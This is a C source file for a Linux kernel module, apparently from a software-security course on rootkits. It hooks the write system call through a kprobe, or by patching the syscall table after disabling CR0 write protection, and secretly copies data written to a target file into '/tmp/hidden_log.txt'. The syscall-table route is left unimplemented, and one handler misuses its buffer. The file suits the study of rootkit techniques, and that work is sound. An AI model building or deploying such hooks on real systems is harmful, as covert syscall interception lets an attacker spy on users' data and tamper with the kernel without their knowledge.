/*
 * syscall-steal.c
 *
 * System call "stealing" sample.
 *
 * Disables page protection at a processor level by changing the 16th bit
 * in the cr0 register (could be Intel specific).
 */

 #include <linux/delay.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/moduleparam.h> /* which will have params */
 #include <linux/unistd.h>      /* The list of system calls */
 #include <linux/cred.h>        /* For current_uid() */
 #include <linux/uidgid.h>      /* For __kuid_val() */
 #include <linux/version.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/fcntl.h>
 #include <linux/file.h>    /* For fget and fput */
 #include <linux/fdtable.h> /* For fget and fput */
 
 /* For the current (process) structure, we need this to know who the
  * current user is.
  */
 #include <linux/sched.h>
 #include <linux/uaccess.h>
 
 #define TARGET_FILE "/home/rootkit/IntroToSoftwareSec/Rootkit-8/log.txt"
 
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0))
 
 #if LINUX_VERSION_CODE <= KERNEL_VERSION(5, 4, 0)
 #define HAVE_KSYS_CLOSE 1
 #include <linux/syscalls.h> /* For ksys_close() */
 #else
 #include <linux/kallsyms.h> /* For kallsyms_lookup_name */
 #endif
 
 #else
 
 #if defined(CONFIG_KPROBES)
 #define HAVE_KPROBES 1
 #if defined(CONFIG_X86_64)
 #define USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL 1
 #endif
 #include <linux/kprobes.h>
 #else
 #define HAVE_PARAM 1
 #include <linux/kallsyms.h> /* For sprint_symbol */
 static unsigned long sym = 0;
 module_param(sym, ulong, 0644);
 #endif                      /* CONFIG_KPROBES */
 
 #endif /* Version < v5.7 */
 
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL
 
 static char *syscall_sym = "__x64_sys_write";
 module_param(syscall_sym, charp, 0644);
 
 static int sys_call_kprobe_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
     struct file *log_file;
     char buf[256] = {0};
     char path_buf[PATH_MAX] = {0};
     char *path;
     
     // The registers here don't contain the actual syscall arguments directly
     // They contain a pointer to another pt_regs structure
     //pr_info("Registers - rdi: %lx, rsi: %lx, rdx: %lx, rcx: %lx, rax: %lx\n",
     //    regs->di, regs->si, regs->dx, regs->cx, regs->ax);
     
     // Extract the actual syscall arguments correctly
     struct pt_regs *real_regs;
     unsigned int fd;
     const char __user *user_buf;
     size_t count;
     
     #if defined(CONFIG_X86_64) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
         // Syscall wrapper is being used
         real_regs = (struct pt_regs *)regs->di;  // First arg is pt_regs pointer
         
         // Verify real_regs is valid
         if (!real_regs) {
             pr_info("Invalid regs pointer\n");
             return 0;
         }
         
         // Extract the actual syscall parameters from real_regs
         fd = (unsigned int)real_regs->di;
         user_buf = (const char __user *)real_regs->si;
         count = (size_t)real_regs->dx;
     #else
         // Direct syscall without wrapper
         fd = (unsigned int)regs->di;
         user_buf = (const char __user *)regs->si;
         count = (size_t)regs->dx;
     #endif
     
     //pr_info("Actual syscall args - fd: %u, buf: %px, count: %zu\n", 
       //      fd, user_buf, count);
     
     // Validate file descriptor range - fd should be a small integer
     if (fd >= 1024) {  // Linux typically allows up to 1024 open files
         pr_info("File descriptor %u out of usual range\n", fd);
         return 0;
     }
 
     // Get the file structure
     struct fd f = fdget(fd);
     if (!f.file) {
         pr_info("Invalid file descriptor %d\n", fd);
         return 0;
     }
     
     // Now we have a valid file, check the path
     path = d_path(&f.file->f_path, path_buf, PATH_MAX);
     if (IS_ERR(path)) {
         pr_info("Error getting path for fd %d: %ld\n", fd, PTR_ERR(path));
         fdput(f);
         return 0;
     }
     
    // pr_info("File path: %s, target: %s\n", path, TARGET_FILE);
     
     // Check if this is our target file
     if (strcmp(path, TARGET_FILE) != 0) {
         // Not our target file, release it and continue normally
         fdput(f);
         return 0;
     }
     
     pr_info("Matched target file! Logging write operation\n");
     
     // Format data for logging - use the user buffer if possible
     if (count > 0 && user_buf) {
         char tmp_buf[128] = {0};
         size_t to_copy = min_t(size_t, count, sizeof(tmp_buf) - 1);
         
         // Copy safely from user space
         if (copy_from_user(tmp_buf, user_buf, to_copy) == 0) {
             // Successfully copied user data
             snprintf(buf, sizeof(buf), "Process %d wrote: %.100s\n", 
                     current->pid, tmp_buf);
         } else {
             // Failed to copy, just log the address
             snprintf(buf, sizeof(buf), "Process %d wrote to file (copy failed)\n", 
                     current->pid);
         }
     } else {
         // No data to copy, just log basic info
         snprintf(buf, sizeof(buf), "Process %d wrote %zu bytes\n", 
                 current->pid, count);
     }
     
     // Open hidden log file
     log_file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (IS_ERR(log_file)) {
         pr_err("Failed to open hidden log file: %ld\n", PTR_ERR(log_file));
         fdput(f);
         return 0;
     }
     
     // Write to hidden log file
     kernel_write(log_file, buf, strlen(buf), &log_file->f_pos);
     
     // Clean up
     filp_close(log_file, NULL);
     fdput(f);
     
     return 0; // Continue with normal execution
 }
 
 static struct kprobe syscall_kprobe = {
     .symbol_name = "__x64_sys_write",
     .pre_handler = sys_call_kprobe_pre_handler,
 };
 
 #else
 
 static unsigned long **sys_call_table_stolen;
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
 static asmlinkage long (*original_call)(const struct pt_regs *);
 #else
 static asmlinkage long (*original_call)(unsigned int, const char __user *, size_t);
 #endif
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
 static asmlinkage long our_sys_write(const struct pt_regs *regs)
 #else
 static asmlinkage long our_sys_write(unsigned int fd, const char __user *buf, size_t count)
 #endif
 {
     struct file *file;
     char kbuf[256] = {0};
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
     unsigned int fd = regs->di;
     const char __user *buf = (const char __user *)regs->si;
     size_t count = regs->dx;
 #endif
 
     // Try to copy user data - be careful with count to avoid overflows
     if (count > 0)
     {
         size_t bytes_to_copy = min(count, (size_t)sizeof(kbuf) - 1);
         unsigned long not_copied;
 
         not_copied = copy_from_user(kbuf, buf, bytes_to_copy);
         if (not_copied < bytes_to_copy)
         {
             kbuf[bytes_to_copy - not_copied] = '\0';
         }
     }
 
     snprintf(kbuf, sizeof(kbuf), "Process %d wrote: %.100s\n", current->pid, kbuf);
 
     file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (!IS_ERR(file))
     {
         kernel_write(file, kbuf, strlen(kbuf), &file->f_pos);
         filp_close(file, NULL);
     }
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
     return original_call(regs);
 #else
     return original_call(fd, buf, count);
 #endif
 }
 
 #endif
 
 /* Functions to disable/enable write protection */
 static inline void disable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
     write_cr0(cr0);
 }
 
 static inline void enable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
     write_cr0(cr0);
 }
 
 /* Function to acquire syscall table - may need implementation */
 static unsigned long **acquire_sys_call_table(void)
 {
     /* Implementation needed here */
     pr_alert("Syscall table acquisition not implemented for this kernel\n");
     return NULL;
 }
 
 static int __init syscall_steal_start(void)
 {
     pr_info("Module loading with kernel %d.%d.%d\n",
             (LINUX_VERSION_CODE >> 16),
             ((LINUX_VERSION_CODE >> 8) & 0xFF),
             (LINUX_VERSION_CODE & 0xFF));
 
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL
     int err;
     syscall_kprobe.symbol_name = syscall_sym;
     err = register_kprobe(&syscall_kprobe);
     if (err)
     {
         pr_err("register_kprobe() on %s failed: %d\n", syscall_sym, err);
         return err;
     }
     pr_info("Registered kprobe for %s\n", syscall_sym);
 #else
     if (!(sys_call_table_stolen = acquire_sys_call_table()))
     {
         pr_err("Failed to acquire syscall table\n");
         return -1;
     }
     pr_info("Acquired syscall table\n");
 
     disable_write_protection();
     original_call = (void *)sys_call_table_stolen[__NR_write];
     sys_call_table_stolen[__NR_write] = (unsigned long *)our_sys_write;
     enable_write_protection();
 #endif
     pr_info("Logging all write syscalls to /tmp/hidden_log.txt\n");
     return 0;
 }
 
 static void __exit syscall_steal_end(void)
 {
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL
     unregister_kprobe(&syscall_kprobe);
     pr_info("Unregistered kprobe for %s\n", syscall_sym);
 #else
     if (!sys_call_table_stolen)
         return;
     disable_write_protection();
     sys_call_table_stolen[__NR_write] = (unsigned long *)original_call;
     enable_write_protection();
     pr_info("Stopped logging write syscalls\n");
 #endif
     msleep(2000);
 }
 
 module_init(syscall_steal_start);
 module_exit(syscall_steal_end);
 
 MODULE_LICENSE("GPL");
 